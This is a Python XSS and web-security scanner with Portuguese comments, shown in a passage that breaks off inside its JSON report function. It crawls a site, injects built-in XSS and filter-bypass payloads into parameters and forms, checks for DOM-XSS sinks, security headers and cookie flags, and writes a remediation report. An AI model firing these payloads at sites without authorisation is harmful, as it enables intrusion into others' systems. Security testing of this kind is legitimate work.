import requests
import re
import sys
import time
import os
import json
import logging
from urllib.parse import urljoin, urlparse, parse_qs, parse_qsl
import concurrent.futures
import urllib3
import colorama
from colorama import Fore, Style
from bs4 import BeautifulSoup
from dotenv import load_dotenv

# Configuração de logging
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler("scanner.log"), logging.StreamHandler()],
)
logger = logging.getLogger("XSSScanner")

# Desabilitar avisos de certificado
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Carregar variáveis de ambiente
load_dotenv()


class AdvancedVulnerabilityScanner:
    def __init__(self, base_url, depth=2, max_urls=100):
        """
        Inicializa o scanner com configurações avançadas

        Args:
            base_url: URL base para escaneamento
            depth: Profundidade de crawling (padrão: 2)
            max_urls: Número máximo de URLs a serem escaneadas (padrão: 100)
        """
        colorama.init(autoreset=True)
        self.base_url = base_url
        self.depth = depth
        self.max_urls = max_urls
        self.session = requests.Session()
        self.visited_urls = set()
        self.urls_to_scan = set([base_url])
        self.found_vulnerabilities = []
        self.forms_tested = set()

        # Configurações avançadas
        self.max_workers = int(os.getenv("MAX_WORKERS", 10))
        self.timeout = int(os.getenv("TIMEOUT", 15))
        self.follow_redirects = os.getenv("FOLLOW_REDIRECTS", "True").lower() == "true"
        self.proxy = os.getenv("PROXY", None)
        self.verify_ssl = os.getenv("VERIFY_SSL", "False").lower() == "true"
        self.user_agent = os.getenv(
            "USER_AGENT",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
        )
        self.cookies = {}

        # Configurar sessão HTTP
        self.session.headers.update(
            {
                "User-Agent": self.user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
                "Accept-Encoding": "gzip, deflate, br",
                "DNT": "1",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
                "Sec-Fetch-Dest": "document",
                "Sec-Fetch-Mode": "navigate",
                "Sec-Fetch-Site": "none",
                "Sec-Fetch-User": "?1",
                "Cache-Control": "max-age=0",
            }
        )

        # Configurar proxy se fornecido
        if self.proxy:
            self.session.proxies = {"http": self.proxy, "https": self.proxy}

        # Carregar payloads de arquivos externos
        self.xss_payloads = self._load_payloads(
            "xss_payloads.txt",
            [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "'\"><script>alert(document.cookie)</script>",
                "<svg/onload=alert('XSS')>",
                "javascript&#58;alert('XSS')",
                "&#x6A;avascript:alert('XSS')",
                "<iframe src='javascript:alert(`XSS`)'>",
                "\" onfocus=alert('XSS') autofocus>",
                "<body onload=alert('XSS')>",
                "<details open ontoggle=alert('XSS')>",
                "<marquee onstart=alert('XSS')>",
                "<div onmouseover='alert(\"XSS\")'></div>",
                "<a href=\"javascript:alert('XSS')\">Click me</a>",
                '<input type="text" value="" onmouseover="alert(\'XSS\')" />',
                "<svg><animate onbegin=alert('XSS') attributeName=x dur=1s>",
                '<math><maction actiontype="statusline#" xlink:href="javascript:alert(\'XSS\')">Click</maction>',
                "<iframe src=\"data:text/html,<script>alert('XSS')</script>\">",
                "<video><source onerror=\"alert('XSS')\">",
                "<video poster=javascript:alert('XSS')//></video>",
                "<audio src=x onerror=alert('XSS')>",
                "<noscript><p title=\"</noscript><img src=x onerror=alert('XSS')\">",
                '<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart="alert(\'XSS\')"></div>',
                '<link rel="stylesheet" href="javascript:alert(\'XSS\');">',
            ],
        )

        # Payloads para bypass de WAFs e filtros
        self.bypass_payloads = self._load_payloads(
            "bypass_payloads.txt",
            [
                "<Img src = x onerror = \"javascript: window['ale'+'rt']('XSS');\">",
                "<svg/onload=setTimeout`alert\`XSS\``;>",
                "'-prompt(1)-'",
                "<sCript>alert(1)</sCriPt>",
                "jav&#x09;ascript:alert('XSS');",
                '<a href="javas&#99;ript:alert(1)">click me</a>',
                "<svg><script>alert&#40;1&#41;</script>",
                "'\"`><img src=xxx:x onerror=javascript:alert(1)>",
                '<iframe/src="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">',
                "<svg><animate onbegin=prompt() attributeName=x>",
                "';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//\";",
            ],
        )

        # Identificar mais contextos de injeção
        self.dom_contexts = [
            "document.write(",
            "document.writeln(",
            "document.domain",
            "innerHTML",
            "outerHTML",
            "eval(",
            "setTimeout(",
            "setInterval(",
            "location.href",
            "location.replace(",
            "location.assign(",
            "element.setAttribute(",
            ".src",
            ".value",
            "jQuery.html(",
            "$('",
        ]

        # Manter estatísticas
        self.stats = {
            "total_urls": 0,
            "total_forms": 0,
            "dom_xss_potential": 0,
            "reflected_xss": 0,
            "stored_xss": 0,
            "start_time": time.time(),
        }

    def validate_url(self, url):
        """Valida se a URL é válida"""
        try:
            result = urlparse(url)
            return all([result.scheme in ("http", "https"), result.netloc])
        except Exception as e:
            logger.error(f"Erro ao validar URL: {e}")
            return False

    def _load_payloads(self, filename, default_payloads):
        """
        Carrega payloads de arquivo ou usa os padrões
        """
        try:
            if os.path.exists(filename):
                with open(filename, "r", encoding="utf-8") as f:
                    payloads = [
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    ]
                logger.info(f"Carregados {len(payloads)} payloads de {filename}")
                return payloads
        except Exception as e:
            logger.warning(
                f"Erro ao carregar payloads de {filename}: {e}. Usando payloads padrão."
            )

        return default_payloads

    def _make_request(self, url, method="GET", data=None, params=None, timeout=None):
        """
        Faz uma requisição HTTP com tratamento de erros
        """
        timeout = timeout or self.timeout
        try:
            if method.upper() == "GET":
                response = self.session.get(
                    url,
                    params=params,
                    verify=self.verify_ssl,
                    allow_redirects=self.follow_redirects,
                    timeout=timeout,
                )
            else:  # POST
                response = self.session.post(
                    url,
                    data=data,
                    verify=self.verify_ssl,
                    allow_redirects=self.follow_redirects,
                    timeout=timeout,
                )
            return response
        except requests.exceptions.Timeout:
            logger.warning(f"Timeout ao acessar {url}")
        except requests.exceptions.ConnectionError:
            logger.warning(f"Erro de conexão ao acessar {url}")
        except requests.exceptions.TooManyRedirects:
            logger.warning(f"Muitos redirecionamentos ao acessar {url}")
        except Exception as e:
            logger.error(f"Erro ao fazer requisição para {url}: {e}")
        return None

    def _extract_forms(self, url, html_content):
        """
        Extrai todos os formulários da página com detalhes completos
        """
        soup = BeautifulSoup(html_content, "html.parser")
        forms = []

        for form in soup.find_all("form"):
            form_details = {
                "action": urljoin(url, form.get("action", "")),
                "method": form.get("method", "get").upper(),
                "id": form.get("id", ""),
                "name": form.get("name", ""),
                "inputs": [],
            }

            # Obter todos os inputs, selects e textareas
            for input_tag in form.find_all(["input", "select", "textarea"]):
                input_type = input_tag.get("type", "text")
                input_name = input_tag.get("name", "")
                input_value = input_tag.get("value", "")

                if (
                    input_type != "submit" and input_name
                ):  # Ignorar botões de submit sem name
                    form_details["inputs"].append(
                        {"type": input_type, "name": input_name, "value": input_value}
                    )

            # Só adicionar formulários que tenham pelo menos um input
            if form_details["inputs"]:
                forms.append(form_details)

        return forms

    def _extract_links(self, url, html_content):
        """
        Extrai todos os links da página filtrados pelo domínio base
        """
        soup = BeautifulSoup(html_content, "html.parser")
        base_domain = urlparse(self.base_url).netloc
        links = set()

        for a_tag in soup.find_all("a", href=True):
            href = a_tag.get("href")
            if (
                not href
                or href.startswith("#")
                or href.startswith("mailto:")
                or href.startswith("tel:")
            ):
                continue

            full_url = urljoin(url, href)
            parsed_url = urlparse(full_url)

            # Remover fragmentos e normalizar
            normalized_url = (
                f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}"
            )
            if parsed_url.query:
                normalized_url += f"?{parsed_url.query}"

            # Verificar se está no mesmo domínio
            if parsed_url.netloc == base_domain:
                links.add(normalized_url)

        return links

    def _test_payload_in_url(self, url, payload):
        """
        Testa um payload em uma URL (parâmetros GET)
        """
        parsed_url = urlparse(url)

        # Se não tem parâmetros, adicionar um
        if not parsed_url.query:
            test_url = f"{url}?xss={payload}"
            return self._test_single_url(test_url, payload)

        # Testar substituindo cada parâmetro
        query_params = parse_qsl(parsed_url.query)
        vulnerabilities = []

        for i, (param_name, _) in enumerate(query_params):
            new_params = query_params.copy()
            new_params[i] = (param_name, payload)

            # Reconstruir a URL
            new_query = "&".join([f"{k}={v}" for k, v in new_params])
            new_url = url.replace(parsed_url.query, new_query)

            result = self._test_single_url(new_url, payload, param_name)
            if result:
                vulnerabilities.append(result)

        return vulnerabilities

    def _test_single_url(self, url, payload, param_name=None):
        """
        Testa uma única URL com payload e verifica se é vulnerável
        """
        try:
            response = self._make_request(url)
            if not response:
                return None

            # Verificar se o payload está refletido intacto
            content_lower = response.text.lower()
            payload_lower = payload.lower()

            # Verificar reflexão direta (considerando codificação HTML)
            reflected = False

            # Verificar reflexão direta
            if payload_lower in content_lower:
                reflected = True

            # Verificar codificações HTML comuns
            html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
            if html_encoded in response.text and not reflected:
                return None  # Não é vulnerável, pois o payload foi codificado adequadamente

            # Verificar se alguma parte executável do payload foi refletida
            executable_patterns = [
                "onerror=",
                "onclick=",
                "onload=",
                "onmouseover=",
                "onfocus=",
                "<script>",
                "javascript:",
                "alert(",
                "confirm(",
                "prompt(",
            ]

            for pattern in executable_patterns:
                if pattern in payload_lower and pattern in content_lower:
                    reflected = True
                    break

            if reflected:
                return {
                    "type": "Reflected XSS",
                    "url": url,
                    "payload": payload,
                    "parameter": param_name or "Injetado diretamente",
                    "evidence": "Payload refletido na resposta",
                    "severity": "Alta",
                }

        except Exception as e:
            logger.error(f"Erro ao testar URL {url}: {e}")

        return None

    def _test_form(self, url, form_details, payload):
        """
        Testa um formulário com payload e verifica se é vulnerável
        """
        # Criar um hash único do formulário para evitar testes duplicados
        form_hash = f"{form_details['action']}_{form_details['method']}_{len(form_details['inputs'])}"
        if form_hash in self.forms_tested:
            return None

        self.forms_tested.add(form_hash)

        # Criar dados de formulário para cada input
        data = {}
        for input_data in form_details["inputs"]:
            # Preencher todos os campos com o payload
            if input_data["type"] not in ["submit", "hidden", "checkbox", "radio"]:
                data[input_data["name"]] = payload
            else:
                # Manter valores originais para campos especiais
                data[input_data["name"]] = input_data["value"]

        # Fazer requisição com os dados do form
        if form_details["method"] == "POST":
            response = self._make_request(
                form_details["action"], method="POST", data=data
            )
        else:
            response = self._make_request(
                form_details["action"], method="GET", params=data
            )

        if not response:
            return None

        # Verificar se o payload está na resposta
        if payload.lower() in response.text.lower():
            # Verificar se o payload foi codificado adequadamente
            html_encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
            if html_encoded in response.text:
                return None  # Não é vulnerável, pois o payload foi codificado

            return {
                "type": "XSS em Formulário",
                "url": url,
                "form_action": form_details["action"],
                "form_method": form_details["method"],
                "payload": payload,
                "inputs": [input_data["name"] for input_data in form_details["inputs"]],
                "evidence": "Payload refletido na resposta após submissão",
                "severity": "Alta",
            }

        return None

    def _check_dom_xss(self, url, html_content):
        """
        Verifica potenciais vulnerabilidades DOM XSS através de análise de código JS
        """
        patterns = [
            r"document\.write\s*\(.*?(?:location|hash|search|href|referrer)",
            r"innerHTML\s*=.*?(?:location|hash|search|href|referrer)",
            r"eval\s*\(.*?(?:location|hash|search|href|referrer)",
            r"setTimeout\s*\(.*?(?:location|hash|search|href|referrer)",
            r"document\.domain\s*=.*?(?:location|hash|search|href|referrer)",
            r"\.src\s*=.*?(?:location|hash|search|href|referrer)",
            r"(?:location|hash|search|href|referrer).*?(?:\+\+|\+=|\+(?!\s*\+))",
            r"jQuery\.html\s*\(.*?(?:location|hash|search|href|referrer)",
        ]

        vulnerabilities = []

        # Extrair todos os scripts embutidos
        soup = BeautifulSoup(html_content, "html.parser")

        # Verificar scripts inline
        for script in soup.find_all("script"):
            script_content = script.string
            if not script_content:
                continue

            for pattern in patterns:
                matches = re.findall(pattern, script_content, re.IGNORECASE)
                if matches:
                    vulnerabilities.append(
                        {
                            "type": "Potencial DOM XSS",
                            "url": url,
                            "evidence": (
                                matches[0][:100] + "..."
                                if len(matches[0]) > 100
                                else matches[0]
                            ),
                            "pattern": pattern,
                            "severity": "Média",
                            "description": "Código JavaScript manipula dados da URL sem sanitização adequada",
                        }
                    )

        # Verificar scripts externos
        for script in soup.find_all("script", src=True):
            script_src = script.get("src")
            if script_src and not script_src.startswith("http"):
                full_script_url = urljoin(url, script_src)
                try:
                    script_response = self._make_request(full_script_url)
                    if script_response and script_response.status_code == 200:
                        for pattern in patterns:
                            matches = re.findall(
                                pattern, script_response.text, re.IGNORECASE
                            )
                            if matches:
                                vulnerabilities.append(
                                    {
                                        "type": "Potencial DOM XSS (Script Externo)",
                                        "url": url,
                                        "script_src": full_script_url,
                                        "evidence": (
                                            matches[0][:100] + "..."
                                            if len(matches[0]) > 100
                                            else matches[0]
                                        ),
                                        "pattern": pattern,
                                        "severity": "Média",
                                        "description": "Script externo manipula dados da URL sem sanitização adequada",
                                    }
                                )
                except Exception as e:
                    logger.error(
                        f"Erro ao analisar script externo {full_script_url}: {e}"
                    )

        # Verificar event handlers inline
        event_handlers = [
            "onclick",
            "onmouseover",
            "onmouseout",
            "onload",
            "onerror",
            "onchange",
            "onfocus",
            "onblur",
            "onkeydown",
            "onkeyup",
            "onsubmit",
        ]

        for event in event_handlers:
            for tag in soup.find_all(attrs={event: True}):
                handler_content = tag.get(event)
                if not handler_content:
                    continue

                for pattern in patterns:
                    matches = re.findall(pattern, handler_content, re.IGNORECASE)
                    if matches:
                        vulnerabilities.append(
                            {
                                "type": f"Potencial DOM XSS (Event Handler)",
                                "url": url,
                                "tag": tag.name,
                                "event": event,
                                "evidence": handler_content,
                                "severity": "Alta",
                                "description": f"Event handler {event} manipula dados da URL sem sanitização",
                            }
                        )

        return vulnerabilities

    def _check_security_headers(self, url, response):
        """
        Verifica cabeçalhos de segurança ausentes ou mal configurados
        """
        issues = []

        headers = response.headers

        # Cabeçalhos importantes de segurança
        security_headers = {
            "Content-Security-Policy": {
                "missing_message": "Content Security Policy (CSP) não configurada",
                "severity": "Alta",
                "description": "A falta de CSP aumenta o risco de ataques XSS e de injeção de conteúdo",
            },
            "X-Content-Type-Options": {
                "missing_message": "X-Content-Type-Options não configurado",
                "severity": "Média",
                "description": "Permite MIME-sniffing que pode levar a ataques XSS",
            },
            "X-Frame-Options": {
                "missing_message": "X-Frame-Options não configurado",
                "severity": "Média",
                "description": "Permite que o site seja carregado em iframes, possibilitando ataques clickjacking",
            },
            "X-XSS-Protection": {
                "missing_message": "X-XSS-Protection não configurado",
                "severity": "Baixa",
                "description": "Filtros XSS do navegador não estão habilitados",
            },
            "Strict-Transport-Security": {
                "missing_message": "HSTS não configurado",
                "severity": "Alta",
                "description": "Comunicação não é forçada via HTTPS seguro",
            },
            "Referrer-Policy": {
                "missing_message": "Referrer-Policy não configurado",
                "severity": "Baixa",
                "description": "Informações sensíveis podem vazar via header Referer",
            },
            "Permissions-Policy": {
                "missing_message": "Permissions-Policy não configurado",
                "severity": "Média",
                "description": "Não limita recursos do navegador que podem ser utilizados",
            },
        }

        for header, config in security_headers.items():
            if header not in headers:
                issues.append(
                    {
                        "type": "Cabeçalho de Segurança Ausente",
                        "url": url,
                        "header": header,
                        "message": config["missing_message"],
                        "severity": config["severity"],
                        "description": config["description"],
                    }
                )
            elif header == "Content-Security-Policy":
                csp = headers[header]
                # Verificar se tem 'unsafe-inline' ou 'unsafe-eval'
                if "unsafe-inline" in csp or "unsafe-eval" in csp:
                    issues.append(
                        {
                            "type": "CSP mal configurado",
                            "url": url,
                            "header": header,
                            "value": csp,
                            "severity": "Média",
                            "description": "CSP permite código inline ou eval, o que reduz sua eficácia contra XSS",
                        }
                    )
                # Verificar se tem 'default-src' ou pelo menos 'script-src'
                if "default-src" not in csp and "script-src" not in csp:
                    issues.append(
                        {
                            "type": "CSP incompleto",
                            "url": url,
                            "header": header,
                            "value": csp,
                            "severity": "Média",
                            "description": "CSP não define uma política padrão ou para scripts",
                        }
                    )
            elif header == "Strict-Transport-Security":
                hsts = headers[header]
                # Verificar se tem max-age adequado (pelo menos 6 meses = 15768000)
                max_age_match = re.search(r"max-age=(\d+)", hsts)
                if max_age_match:
                    max_age = int(max_age_match.group(1))
                    if max_age < 15768000:
                        issues.append(
                            {
                                "type": "HSTS com max-age curto",
                                "url": url,
                                "header": header,
                                "value": hsts,
                                "severity": "Baixa",
                                "description": f"HSTS com max-age muito curto ({max_age} segundos)",
                            }
                        )

        # Verificar cookies
        if response.cookies:
            for cookie in response.cookies:
                cookie_issues = []

                # Verificar flags importantes
                if not cookie.secure:
                    cookie_issues.append("não usa flag Secure")

                if not cookie.has_nonstandard_attr("HttpOnly"):
                    cookie_issues.append("não usa flag HttpOnly")

                if cookie.has_nonstandard_attr("SameSite"):
                    samesite = cookie._rest.get("SameSite")
                    if samesite.lower() == "none":
                        cookie_issues.append("usa SameSite=None")
                else:
                    cookie_issues.append("não define SameSite")

                if cookie_issues:
                    issues.append(
                        {
                            "type": "Cookie inseguro",
                            "url": url,
                            "cookie_name": cookie.name,
                            "issues": cookie_issues,
                            "severity": "Média",
                            "description": f'Cookie {cookie.name} tem configurações inseguras: {", ".join(cookie_issues)}',
                        }
                    )

        return issues

    def _extract_html_comments(self, url, html_content):
        """
        Extrai comentários HTML que podem conter informações sensíveis
        """
        comment_pattern = re.compile(r"<!--(.*?)-->", re.DOTALL)
        comments = comment_pattern.findall(html_content)

        sensitive_patterns = [
            r"password",
            r"token",
            r"secret",
            r"key",
            r"auth",
            r"todo",
            r"fixme",
            r"debug",
            r"remove",
            r"temporary",
            r"prod",
            r"credit\s*card",
            r"api\s*key",
        ]

        issues = []

        for comment in comments:
            comment_text = comment.strip()
            if len(comment_text) > 5:  # Ignorar comentários muito curtos
                for pattern in sensitive_patterns:
                    if re.search(pattern, comment_text, re.IGNORECASE):
                        issues.append(
                            {
                                "type": "Comentário HTML sensível",
                                "url": url,
                                "evidence": (
                                    comment_text
                                    if len(comment_text) < 100
                                    else comment_text[:100] + "..."
                                ),
                                "pattern": pattern,
                                "severity": "Baixa",
                                "description": "Comentário HTML pode conter informações sensíveis",
                            }
                        )
                        break

        return issues

    def _check_stored_xss(self, url_data, payload):
        """
        Verifica se um payload foi armazenado no site (XSS persistente)
        """
        # Este é um método simplificado - detecção real de XSS armazenado requer enviar dados,
        # e depois verificar outras páginas para ver se o payload aparece
        return None  # Implementação básica

    def crawl_and_scan(self):
        """
        Realiza o crawling do site e executa todos os testes
        """
        print(
            f"{Fore.CYAN}🔍 Iniciando scan completo em: {self.base_url}{Style.RESET_ALL}"
        )
        logger.info(
            f"Iniciando scan em {self.base_url} (profundidade: {self.depth}, máx URLs: {self.max_urls})"
        )

        current_depth = 0

        while (
            self.urls_to_scan
            and current_depth <= self.depth
            and len(self.visited_urls) < self.max_urls
        ):
            # Obter próxima leva de URLs para esta profundidade
            current_urls = list(self.urls_to_scan)
            self.urls_to_scan = set()

            print(
                f"{Fore.YELLOW}➤ Escaneando {len(current_urls)} URLs na profundidade {current_depth}{Style.RESET_ALL}"
            )

            # Usar ThreadPoolExecutor para acelerar o processo
            with concurrent.futures.ThreadPoolExecutor(
                max_workers=self.max_workers
            ) as executor:
                futures = [
                    executor.submit(self._process_url, url) for url in current_urls
                ]

                # Processar resultados à medida que ficam disponíveis
                for future in concurrent.futures.as_completed(futures):
                    try:
                        # Recuperar resultados do processamento
                        new_links, vulnerabilities = future.result()

                        # Adicionar novas URLs a serem escaneadas
                        for link in new_links:
                            if (
                                link not in self.visited_urls
                                and len(self.visited_urls) < self.max_urls
                            ):
                                self.urls_to_scan.add(link)

                        # Adicionar vulnerabilidades encontradas
                        for vuln in vulnerabilities:
                            if vuln not in self.found_vulnerabilities:
                                self._report_vulnerability(vuln)
                                self.found_vulnerabilities.append(vuln)
                    except Exception as e:
                        logger.error(f"Erro ao processar um URL: {e}")

            # Incrementar profundidade
            current_depth += 1

        # Calcular estatísticas finais
        self.stats["end_time"] = time.time()
        self.stats["total_urls"] = len(self.visited_urls)
        self.stats["total_vulnerabilities"] = len(self.found_vulnerabilities)
        self.stats["scan_duration"] = self.stats["end_time"] - self.stats["start_time"]

        # Classificar vulnerabilidades
        for vuln in self.found_vulnerabilities:
            vuln_type = vuln.get("type", "").lower()
            if "reflected" in vuln_type:
                self.stats["reflected_xss"] += 1
            elif "dom" in vuln_type:
                self.stats["dom_xss_potential"] += 1
            elif "stored" in vuln_type:
                self.stats["stored_xss"] += 1

        return self.found_vulnerabilities

    def _process_url(self, url):
        """
        Processa um único URL: crawling e testes de vulnerabilidade
        """
        if url in self.visited_urls:
            return set(), []

        self.visited_urls.add(url)
        new_links = set()
        vulnerabilities = []

        # Mostrar progresso
        print(
            f"{Fore.BLUE}📄 Analisando URL ({len(self.visited_urls)}/{self.max_urls}): {url}{Style.RESET_ALL}"
        )

        # Fazer request inicial para o URL
        response = self._make_request(url)
        if not response:
            return new_links, vulnerabilities

        # Extrair links e formulários
        try:
            links = self._extract_links(url, response.text)
            forms = self._extract_forms(url, response.text)

            self.stats["total_forms"] += len(forms)

            # Verificar problemas de cabeçalhos de segurança
            security_issues = self._check_security_headers(url, response)
            vulnerabilities.extend(security_issues)

            # Verificar comentários HTML suspeitos
            comment_issues = self._extract_html_comments(url, response.text)
            vulnerabilities.extend(comment_issues)

            # Verificar DOM XSS
            dom_xss_issues = self._check_dom_xss(url, response.text)
            vulnerabilities.extend(dom_xss_issues)

            # Testar parâmetros GET com payloads XSS
            with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
                # Testar cada payload em cada URL
                futures = []

                # Testar URLs
                for payload in self.xss_payloads:
                    futures.append(
                        executor.submit(self._test_payload_in_url, url, payload)
                    )

                # Testar formulários com cada payload
                for form in forms:
                    for payload in self.xss_payloads:
                        futures.append(
                            executor.submit(self._test_form, url, form, payload)
                        )

                    # Teste adicional com payloads de bypass
                    for payload in self.bypass_payloads:
                        futures.append(
                            executor.submit(self._test_form, url, form, payload)
                        )

                for future in concurrent.futures.as_completed(futures):
                    try:
                        result = future.result()
                        if result:
                            if isinstance(result, list):
                                vulnerabilities.extend(result)
                            else:
                                vulnerabilities.append(result)
                    except Exception as e:
                        logger.error(f"Erro ao testar vulnerabilidade: {e}")

            return links, vulnerabilities

        except Exception as e:
            logger.error(f"Erro ao processar URL {url}: {e}")
            return new_links, vulnerabilities

    def _report_vulnerability(self, vulnerability):
        """
        Reporta uma vulnerabilidade encontrada
        """
        vuln_type = vulnerability.get("type", "Desconhecido")
        severity = vulnerability.get("severity", "Média")
        url = vulnerability.get("url", "N/A")

        # Colorir conforme severidade
        severity_color = Fore.YELLOW
        if severity.lower() == "alta":
            severity_color = Fore.RED
        elif severity.lower() == "baixa":
            severity_color = Fore.GREEN

        print(f"\n{Fore.RED}🚨 VULNERABILIDADE DETECTADA! {Style.RESET_ALL}")
        print(f"{Fore.MAGENTA}Tipo:{Style.RESET_ALL} {vuln_type}")
        print(
            f"{Fore.MAGENTA}Severidade:{Style.RESET_ALL} {severity_color}{severity}{Style.RESET_ALL}"
        )
        print(f"{Fore.MAGENTA}URL:{Style.RESET_ALL} {url}")

        # Imprimir detalhes específicos com base no tipo de vulnerabilidade
        for key, value in vulnerability.items():
            if key not in ["type", "severity", "url"] and value:
                print(f"{Fore.MAGENTA}{key.capitalize()}:{Style.RESET_ALL} {value}")

    def generate_report(self):
        """
        Gera um relatório detalhado das vulnerabilidades encontradas
        """
        print(f"\n{Fore.CYAN}📋 Relatório Final de Vulnerabilidades{Style.RESET_ALL}")

        if self.found_vulnerabilities:
            total_vulns = len(self.found_vulnerabilities)
            high_severity = len(
                [
                    v
                    for v in self.found_vulnerabilities
                    if v.get("severity", "").lower() == "alta"
                ]
            )
            medium_severity = len(
                [
                    v
                    for v in self.found_vulnerabilities
                    if v.get("severity", "").lower() == "média"
                ]
            )
            low_severity = len(
                [
                    v
                    for v in self.found_vulnerabilities
                    if v.get("severity", "").lower() == "baixa"
                ]
            )

            print(
                f"{Fore.RED}🚨 FORAM ENCONTRADAS {total_vulns} VULNERABILIDADES!{Style.RESET_ALL}"
            )
            print(f"   {Fore.RED}► Alta Severidade: {high_severity}{Style.RESET_ALL}")
            print(
                f"   {Fore.YELLOW}► Média Severidade: {medium_severity}{Style.RESET_ALL}"
            )
            print(f"   {Fore.GREEN}► Baixa Severidade: {low_severity}{Style.RESET_ALL}")

            # Estatísticas
            print(f"\n{Fore.CYAN}📊 ESTATÍSTICAS DE ESCANEAMENTO:{Style.RESET_ALL}")
            print(f"   ► URLs escaneadas: {self.stats['total_urls']}")
            print(f"   ► Formulários testados: {self.stats['total_forms']}")
            print(f"   ► Potenciais DOM XSS: {self.stats['dom_xss_potential']}")
            print(f"   ► XSS Refletidos: {self.stats['reflected_xss']}")
            print(f"   ► XSS Armazenados: {self.stats['stored_xss']}")
            print(
                f"   ► Tempo de escaneamento: {self.stats['scan_duration']:.2f} segundos"
            )

            # Salvar relatório em arquivo de texto
            with open("vulnerability_report.txt", "w", encoding="utf-8") as f:
                f.write("=====================================================\n")
                f.write("  RELATÓRIO DE VULNERABILIDADES DE SEGURANÇA WEB\n")
                f.write("=====================================================\n\n")
                f.write(f"URL Base: {self.base_url}\n")
                f.write(f"Data do Scan: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Duração: {self.stats['scan_duration']:.2f} segundos\n\n")

                f.write("=====================================================\n")
                f.write("  RESUMO DE VULNERABILIDADES\n")
                f.write("=====================================================\n\n")
                f.write(f"Total de vulnerabilidades: {total_vulns}\n")
                f.write(f"- Alta Severidade: {high_severity}\n")
                f.write(f"- Média Severidade: {medium_severity}\n")
                f.write(f"- Baixa Severidade: {low_severity}\n\n")

                f.write("=====================================================\n")
                f.write("  ESTATÍSTICAS DE ESCANEAMENTO\n")
                f.write("=====================================================\n\n")
                f.write(f"URLs escaneadas: {self.stats['total_urls']}\n")
                f.write(f"Formulários testados: {self.stats['total_forms']}\n")
                f.write(f"Potenciais DOM XSS: {self.stats['dom_xss_potential']}\n")
                f.write(f"XSS Refletidos: {self.stats['reflected_xss']}\n")
                f.write(f"XSS Armazenados: {self.stats['stored_xss']}\n\n")

                f.write("=====================================================\n")
                f.write("  DETALHES DAS VULNERABILIDADES\n")
                f.write("=====================================================\n\n")

                # Agrupar vulnerabilidades por severidade
                for severity in ["Alta", "Média", "Baixa"]:
                    severity_vulns = [
                        v
                        for v in self.found_vulnerabilities
                        if v.get("severity", "").lower() == severity.lower()
                    ]
                    if severity_vulns:
                        f.write(
                            f"\n--- Vulnerabilidades de Severidade {severity} ({len(severity_vulns)}) ---\n\n"
                        )

                        for i, vuln in enumerate(severity_vulns, 1):
                            f.write(f"Vulnerabilidade #{i}\n")
                            f.write(f"Tipo: {vuln.get('type', 'N/A')}\n")
                            f.write(f"URL: {vuln.get('url', 'N/A')}\n")

                            # Escrever detalhes específicos
                            for key, value in vuln.items():
                                if key not in ["type", "severity", "url"] and value:
                                    f.write(f"{key.capitalize()}: {value}\n")

                            f.write("Recomendação: ")

                            # Adicionar recomendações específicas com base no tipo
                            vuln_type = vuln.get("type", "").lower()
                            if "xss" in vuln_type:
                                f.write(
                                    "Sanitize todas as entradas de usuários antes de refletir na página. "
                                    "Implemente uma política CSP rigorosa e utilize funções de escape HTML.\n"
                                )
                            elif "header" in vuln_type:
                                f.write(
                                    "Configure os cabeçalhos de segurança adequadamente para proteger contra "
                                    "ataques comuns de injeção e controle de conteúdo.\n"
                                )
                            elif "cookie" in vuln_type:
                                f.write(
                                    "Configure flags de segurança adequadas nos cookies (HttpOnly, Secure, SameSite).\n"
                                )
                            else:
                                f.write(
                                    "Revise este componente quanto a possíveis problemas de segurança e "
                                    "implemente validação adequada de entradas.\n"
                                )

                            f.write("\n")

            print(
                f"{Fore.GREEN}✅ Relatório salvo em vulnerability_report.txt{Style.RESET_ALL}"
            )

        else:
            print(
                f"{Fore.GREEN}✅ Nenhuma vulnerabilidade crítica encontrada{Style.RESET_ALL}"
            )
            with open("vulnerability_report.txt", "w", encoding="utf-8") as f:
                f.write("=====================================================\n")
                f.write("  RELATÓRIO DE VULNERABILIDADES DE SEGURANÇA WEB\n")
                f.write("=====================================================\n\n")
                f.write(f"URL Base: {self.base_url}\n")
                f.write(f"Data do Scan: {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"Duração: {self.stats['scan_duration']:.2f} segundos\n\n")
                f.write(
                    "Nenhuma vulnerabilidade crítica foi encontrada durante o escaneamento.\n"
                )
                f.write(
                    "Isso não garante que o site esteja completamente seguro. Considere realizar testes de penetração regulares.\n"
                )

    def generate_report_json(self):
        """
        Gera um relatório detalhado em formato JSON
        """
        report = {
            "scan_info": {
                "base_url": self.base_url,
                "scan_date": time.strftime("%Y-%m-%d %H:%M:%S"),
                "scan_duration": f"{self.stats['scan_duration']:.2f} segundos",
                "urls_scanned": self.stats["total_urls"],
                "forms_tested": self.stats["total_forms"],
            },
            "summary": {
                "total_vulnerabilities": len(self.found_vulnerabilities),
                "high_severity": len(
                    [
                        v
                        for v in self.found_vulnerabilities
                        if v.get("severity", "").lower() == "alta"
                    ]
                ),
                "medium_severity": len(
                    [
                        v
                        for v in self.found_vulnerabilities
                        if v.get("severity", "").lower() == "média"
                    ]
                ),
                "low_severity": len(
                    [
                        v
                        for v in self.found_vulnerabilities
